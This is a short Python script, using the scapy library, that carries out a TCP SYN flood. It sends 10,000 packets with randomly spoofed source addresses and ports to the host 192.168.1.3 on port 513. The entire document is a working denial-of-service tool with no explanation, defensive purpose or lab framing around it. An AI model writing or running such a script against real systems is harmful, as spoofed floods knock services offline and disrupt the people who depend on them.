import random
from scapy.all import IP, TCP, send

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def syn_flood(tgt, dport):
    for _ in range(10000):  # Adjust the number of packets to send
        src = random_ip()
        sport = random.randint(1024, 65535)
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=dport)
        pkt = ip_layer / tcp_layer
        send(pkt, verbose=False)

if __name__ == "__main__":
    tgt = "192.168.1.3"
    dport = 513
    syn_flood(tgt, dport)
